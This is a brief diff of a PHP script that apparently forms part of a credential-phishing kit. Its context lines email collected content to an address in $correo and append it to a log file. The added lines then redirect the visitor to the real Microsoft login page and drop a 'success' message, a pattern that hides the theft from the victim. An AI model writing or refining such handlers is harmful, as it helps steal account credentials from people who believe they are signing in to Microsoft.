@@ -27,5 +27,9 @@ mail($correo, $subj, $content, $from);
     $file=fopen($logsfile, "a+"); 
     fwrite($file,$content); 
     fclose($file);
+
+header("Location: https://login.microsoftonline.com/");
+exit;
+
 ?>
-Exito
+
